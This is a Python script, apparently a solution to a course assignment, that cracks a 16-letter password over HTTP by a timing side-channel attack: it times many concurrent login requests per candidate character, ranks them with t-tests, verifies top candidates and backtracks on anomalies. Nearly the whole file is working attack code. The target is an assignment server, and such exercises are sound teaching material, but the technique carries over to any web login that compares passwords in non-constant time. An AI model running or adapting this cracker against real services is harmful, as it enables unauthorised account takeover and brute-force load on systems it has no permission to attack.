import sys
import time
import asyncio
import aiohttp
import numpy as np
from scipy import stats as scipy_stats
from typing import List, Dict, Tuple
import argparse
from collections import defaultdict

# Configuration
CHARACTERS = "abcdefghijklmnopqrstuvwxyz"
PASSWORD_LENGTH = 16
QUICK_SCAN_RETRIES = 15
VERIFICATION_RETRIES = 20
TOP_CANDIDATES_TO_VERIFY = 7  
MAX_CONCURRENT_REQUESTS = 30
SESSION_TIMEOUT = aiohttp.ClientTimeout(total=10)


def eprint(*args, **kwargs):
    print(*args, file=sys.stderr, **kwargs)

class PositionStats:
    def __init__(self):
        self.baseline_time = 0
        self.best_char = None
        self.char_timings = {}
        self.char_scores = {}
        self.avg_response_time = 0
        self.alternative_chars = []  # Store alternative characters for backtracking

class FastPasswordCracker:
    def __init__(self, server_url: str, difficulty: int):
        self.server_url = server_url
        self.difficulty = difficulty
        self.max_concurrent = max(5, MAX_CONCURRENT_REQUESTS // difficulty)
        self.timeout = 5 + (1 * difficulty)
        self.position_history = []  # Store statistics for each position
        self.expected_time_increase = 1.15  # Expected 15% increase per position
        self.backtrack_threshold = 0.8  # 20% timing inconsistency threshold

    def find_best_backtrack_position(self, current_position: int) -> tuple[int, str | None]:
        """
        Determines the best position to backtrack to based on timing analysis.
        Returns a tuple of (position to backtrack to, suggested next character or None)
        """
        if current_position <= 1 or len(self.position_history) < 2:
            return current_position, None
            
        # Ensure we only look at positions we have history for
        valid_positions = min(current_position, len(self.position_history))
        
        # Look for suspicious timing patterns
        expected_times = []
        actual_times = []
        timing_ratios = []
        
        # Safety check for position history
        if valid_positions < 2:
            return current_position, None
        
        # First pass: collect timing data and ratios
        for pos in range(1, valid_positions):
            try:
                prev_stats = self.position_history[pos-1]
                curr_stats = self.position_history[pos]
            except IndexError:
                # If we somehow hit an index error, stop here
                return current_position, None
            
            expected_time = prev_stats.avg_response_time * self.expected_time_increase
            actual_time = curr_stats.avg_response_time
            
            expected_times.append(expected_time)
            actual_times.append(actual_time)
            
            # Calculate relative timing difference
            timing_ratio = actual_time / expected_time
            timing_ratios.append(timing_ratio)
            
            # Immediate red flag: if we see no significant increase in timing
            if timing_ratio < self.backtrack_threshold:
                eprint(f"\nSuspicious timing at position {pos}:")
                eprint(f"Expected: {expected_time*1000:.1f}ms")
                eprint(f"Actual: {actual_time*1000:.1f}ms")
                eprint(f"Ratio: {timing_ratio:.2f}")
                # Try the next alternative character from the previous position
                prev_alternatives = self.position_history[pos-1].alternative_chars
                suggested_char = prev_alternatives[0] if prev_alternatives else None
                return max(0, pos - 1), suggested_char
        
        # Second pass: analyze progression patterns
        if len(timing_ratios) >= 2:
            # Check for plateau or decrease in timing progression
            max_check_pos = min(len(timing_ratios), valid_positions - 1)
            for pos in range(1, max_check_pos):
                current_ratio = timing_ratios[pos]
                prev_ratio = timing_ratios[pos-1]
                
                # If we see timing increase slow down or insufficient statistical significance
                # Check if the best character is significantly better than baseline
                curr_best_char = self.position_history[pos].best_char
                curr_best_score = self.position_history[pos].char_scores[curr_best_char]
                curr_best_timings = self.position_history[pos].char_timings[curr_best_char]
                
                # Calculate baseline from other characters
                other_timings = []
                for char, timings in self.position_history[pos].char_timings.items():
                    if char != curr_best_char:
                        other_timings.extend([t for t in timings if t != float('inf')])
                
                # If we have enough samples and the best character is significantly better, don't backtrack
                if (len(curr_best_timings) >= 5 and len(other_timings) >= 5):
                    _, p_value = scipy_stats.ttest_ind([t for t in curr_best_timings if t != float('inf')], 
                                                      other_timings, equal_var=False)
                    if p_value < 0.05 and curr_best_score > 0.15:
                        eprint(f"\nSkipping backtrack - strong candidate found: '{curr_best_char}' (p={p_value:.6f}, score={curr_best_score:.3f})")
                        continue
                
                # Otherwise, check timing progression as before
                if current_ratio < prev_ratio * 0.85 or curr_best_score < 0.15:  # More sensitive threshold
                    eprint(f"\nTiming progression anomaly at position {pos+1}:")
                    eprint(f"Previous ratio: {prev_ratio:.2f}")
                    eprint(f"Current ratio: {current_ratio:.2f}")
                    # Try an alternative character from this position
                    alternatives = self.position_history[pos].alternative_chars
                    suggested_char = alternatives[0] if alternatives else None
                    return pos, suggested_char
                
                # More aggressive backtracking on timing plateaus or weak statistical significance
                if (current_ratio < 1.1 and prev_ratio < 1.1) or self.position_history[pos].char_scores[self.position_history[pos].best_char] < 0.15:
                    # Try the next alternative character
                    alternatives = self.position_history[pos].alternative_chars
                    suggested_char = alternatives[0] if alternatives else None
                    return pos, suggested_char
        
        # Third pass: check overall pattern
        if len(actual_times) >= 3 and len(self.position_history) >= 3:
            # Calculate expected geometric progression
            expected_progression = np.array([actual_times[0] * (1.15 ** i) for i in range(len(actual_times))])
            actual_progression = np.array(actual_times)
            
            # Compare actual vs expected progression
            ratio_diff = actual_progression / expected_progression
            if np.mean(ratio_diff) < 0.9:  # Overall progression is too slow
                eprint("\nOverall timing progression is slower than expected")
                # Find where it started deviating
                for i, ratio in enumerate(ratio_diff):
                    if ratio < 0.9:
                        # Try an alternative character from the previous position
                        alternatives = self.position_history[max(0, i-1)].alternative_chars
                        suggested_char = alternatives[0] if alternatives else None
                        return max(0, i - 1), suggested_char
        
        return current_position, None  # No clear backtracking point found

    async def measure_request(self, session: aiohttp.ClientSession, url: str) -> float:
        try:
            start = time.time()
            async with session.get(url, timeout=self.timeout) as response:
                await response.text()
            return time.time() - start
        except Exception:
            return float('inf')

    async def measure_batch(self, urls: List[str]) -> List[float]:
        all_timings = []
        async with aiohttp.ClientSession(timeout=SESSION_TIMEOUT) as session:
            batch_size = self.max_concurrent
            for i in range(0, len(urls), batch_size):
                batch_urls = urls[i:i + batch_size]
                tasks = [self.measure_request(session, url) for url in batch_urls]
                batch_timings = await asyncio.gather(*tasks)
                all_timings.extend(batch_timings)
                if i + batch_size < len(urls):
                    await asyncio.sleep(0.05 / self.difficulty)
        return all_timings

    def analyze_timings(self, timings: List[float], baseline_timings: List[float] = None) -> Tuple[float, float, float, float]:
        """Analyze timing measurements with detailed statistics."""
        valid_timings = [t for t in timings if t != float('inf')]
        if not valid_timings:
            return 0, 0, 0, 0
        
        timing_array = np.array(valid_timings)
        median_time = np.median(timing_array)
        mean_time = np.mean(timing_array)
        std_time = np.std(timing_array)
        
        # Calculate score based on timing and consistency
        score = 0
        if baseline_timings:
            baseline_array = np.array([t for t in baseline_timings if t != float('inf')])
            if len(baseline_array) > 0:
                baseline_median = np.median(baseline_array)
                score = (median_time - baseline_median) / baseline_median
                
        return median_time, mean_time, std_time, score

    async def test_position(self, username: str, partial_password: str, position: int) -> PositionStats:
        """Test all characters at a position with comprehensive analysis."""
        stats = PositionStats()
        eprint(f"\nQuick scan phase:")
        
        # Get baseline timing
        baseline = partial_password + 'a' * (PASSWORD_LENGTH - len(partial_password))
        baseline_urls = [f"{self.server_url}/?user={username}&password={baseline}&difficulty={self.difficulty}"] * QUICK_SCAN_RETRIES
        baseline_timings = await self.measure_batch(baseline_urls)
        stats.baseline_time = np.median([t for t in baseline_timings if t != float('inf')])
        
        eprint(f"\nBaseline median time: {stats.baseline_time*1000:.1f}ms")
        
        # Test each character
        results = {}
        best_timings = []
        other_timings = []
        
        for char in CHARACTERS:
            candidate = partial_password + char + 'a' * (PASSWORD_LENGTH - len(partial_password) - 1)
            urls = [f"{self.server_url}/?user={username}&password={candidate}&difficulty={self.difficulty}"] * QUICK_SCAN_RETRIES
            timings = await self.measure_batch(urls)
            
            median_time, mean_time, std_time, score = self.analyze_timings(timings, baseline_timings)
            stats.char_timings[char] = timings
            stats.char_scores[char] = score
            
            eprint(f"Char '{char}': median={median_time*1000:.1f}ms, mean={mean_time*1000:.1f}ms, "
                  f"std={std_time*1000:.1f}ms, n={len([t for t in timings if t != float('inf')])}, score={score:.3f}")
            
            results[char] = (median_time, score)
        
        # Sort by score and find best candidates
        sorted_chars = sorted(results.items(), key=lambda x: x[1][1], reverse=True)
        stats.best_char = sorted_chars[0][0]
        stats.alternative_chars = [char for char, _ in sorted_chars[1:6]]
        
        # Perform t-test for best character
        best_times = [t for t in stats.char_timings[stats.best_char] if t != float('inf')]
        other_times = []
        for char in CHARACTERS:
            if char != stats.best_char:
                other_times.extend([t for t in stats.char_timings[char] if t != float('inf')])
        
        if len(best_times) >= 5 and len(other_times) >= 5:
            t_stat, p_value = scipy_stats.ttest_ind(best_times, other_times, equal_var=False)
            eprint(f"\nT-test for '{stats.best_char}': p-value = {p_value:.6f}")
        
        # Calculate average response time for progress checking
        stats.avg_response_time = np.mean([med for med, _ in results.values()])
        
        eprint(f"\nTop 5 candidates: {[stats.best_char] + stats.alternative_chars[:4]}")
        
        return stats

    async def verify_top_candidates(self, username: str, partial_password: str, candidates: list, position: int) -> tuple:
        """Do additional testing of top candidates to confirm significance."""
        eprint("\nVerifying top candidates...")
        
        # Get baseline timing with more samples for stability
        baseline = partial_password + 'a' * (PASSWORD_LENGTH - len(partial_password))
        baseline_urls = [f"{self.server_url}/?user={username}&password={baseline}&difficulty={self.difficulty}"] * VERIFICATION_RETRIES
        baseline_timings = await self.measure_batch(baseline_urls)
        baseline_median = np.median([t for t in baseline_timings if t != float('inf')])
        
        # Test top candidates with more samples
        results = {}
        all_timings = []
        for char in candidates[:TOP_CANDIDATES_TO_VERIFY]:  # Use configurable constant
            candidate = partial_password + char + 'a' * (PASSWORD_LENGTH - len(partial_password) - 1)
            urls = [f"{self.server_url}/?user={username}&password={candidate}&difficulty={self.difficulty}"] * VERIFICATION_RETRIES
            timings = await self.measure_batch(urls)
            
            valid_timings = [t for t in timings if t != float('inf')]
            if valid_timings:
                median_time = np.median(valid_timings)
                # Calculate relative difference from baseline
                score = (median_time - baseline_median) / baseline_median
                results[char] = (valid_timings, score)
                all_timings.extend(valid_timings)
                eprint(f"Verification of '{char}': median={median_time*1000:.1f}ms, score={score:.3f}")
        
        if not results:
            return candidates[0], False
            
        # Find char with highest median time
        best_char = max(results.items(), key=lambda x: x[1][1])[0]
        best_timings = results[best_char][0]
        
        # Collect other timings for comparison
        other_timings = []
        for char, (timings, _) in results.items():
            if char != best_char:
                other_timings.extend(timings)
        
        if len(best_timings) >= 5 and len(other_timings) >= 5:
            t_stat, p_value = scipy_stats.ttest_ind(best_timings, other_timings, equal_var=False)
            eprint(f"Final verification t-test for '{best_char}': p-value = {p_value:.6f}")
            
            # Check both statistical significance and relative timing difference
            median_diff = (np.median(best_timings) - np.median(other_timings)) / np.median(other_timings)
            is_significant = p_value < 0.01 and median_diff > 0.15  # Require 15% timing difference
            
            if is_significant:
                eprint(f"Character '{best_char}' confirmed with {median_diff*100:.1f}% timing difference!")
                return best_char, True
            
        return best_char, False

    async def find_password(self, username: str) -> str:
        """Find password with intelligent backtracking and verification."""
        eprint(f"Finding password (difficulty {self.difficulty})...")
        password = ""
        position = 0
        
        while position < PASSWORD_LENGTH:
            eprint(f"\nPosition {position} search:")
            
            # Test current position
            stats = await self.test_position(username, password, position)
            
            # Get top candidates
            sorted_chars = sorted(stats.char_scores.items(), key=lambda x: x[1], reverse=True)
            top_candidates = [char for char, _ in sorted_chars[:3]]
            
            eprint(f"\nTop candidates: {top_candidates}")
            
            # Verify top candidates
            best_char, is_significant = await self.verify_top_candidates(username, password, top_candidates, position)
            
            # Check if the timing differences are too small
            max_score = max(stats.char_scores.values())
            score_spread = max_score - sorted(stats.char_scores.values())[-2]  # Difference between best and second best
            
            if is_significant and score_spread > 0.1:  # Require meaningful separation between best and second best
                # If we have a statistically significant winner, use it
                password += best_char
                self.position_history.append(stats)
                eprint(f"Selected character (significant): '{best_char}'")
                eprint(f"Current password: {password}")
                position += 1
            else:
                # Check timing progression
                if position > 0:
                    eprint("\nChecking timing progression...")
                    backtrack_pos, suggested_char = self.find_best_backtrack_position(position)
                    
                    if backtrack_pos < position:
                        eprint(f"\nBacktracking from position {position} to {backtrack_pos}")
                        # Reset to the backtrack position
                        # Ensure we don't backtrack beyond the start
                        position = max(0, backtrack_pos)
                        password = password[:position]
                        # Ensure we don't trim position_history beyond what exists
                        if position < len(self.position_history):
                            self.position_history = self.position_history[:position]
                        
                        if suggested_char:
                            eprint(f"Trying suggested alternative character: '{suggested_char}'")
                            password += suggested_char
                            position += 1
                        else:
                            # No specific character suggested, continue with best candidate
                            eprint("No specific alternative suggested, continuing with best candidate")
                            password += best_char
                            self.position_history.append(stats)
                            position += 1
                    else:
                        # If no clear backtrack point, proceed with best candidate
                        password += best_char
                        self.position_history.append(stats)
                        eprint(f"Selected character (no backtrack): '{best_char}'")
                        eprint(f"Current password: {password}")
                        position += 1
                else:
                    # At position 0, just use the best candidate
                    password += best_char
                    self.position_history.append(stats)
                    eprint(f"Selected character (position 0): '{best_char}'")
                    eprint(f"Current password: {password}")
                    position += 1
            
            progress = position / PASSWORD_LENGTH * 100
            eprint(f"Progress: {progress:.1f}%")
        
        return password

async def verify_password(server_url: str, username: str, password: str, difficulty: int) -> bool:
    """Verify if the password is correct."""
    url = f"{server_url}/?user={username}&password={password}&difficulty={difficulty}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                result = await response.text()
                return result.strip() == "1"
    except:
        return False

async def main():
    parser = argparse.ArgumentParser(description='Fast password cracker with backtracking')
    parser.add_argument('username', help='Username to crack password for')
    parser.add_argument('difficulty', type=int, help='Difficulty level')
    parser.add_argument('--server', default='http://127.0.0.1',
                      help='Server URL (default: http://aoi-assignment1.oy.ne.ro:8080)')
    args = parser.parse_args()

    start_time = time.time()
    
    try:
        cracker = FastPasswordCracker(args.server, args.difficulty)
        password = await cracker.find_password(args.username)
        
        # Verify the password before printing
        is_correct = await verify_password(args.server, args.username, password, args.difficulty)
        if is_correct:
            print(password)  # Only password to stdout
        else:
            eprint("\nWarning: Found password could not be verified!")
            print(password)  # Print anyway, might be correct despite verification failure
            
    finally:
        total_time = time.time() - start_time
        eprint(f"\nTotal execution time: {int(total_time//60)}m {total_time%60:.3f}s")

if __name__ == "__main__":
    asyncio.run(main())
    
#http://127.0.0.1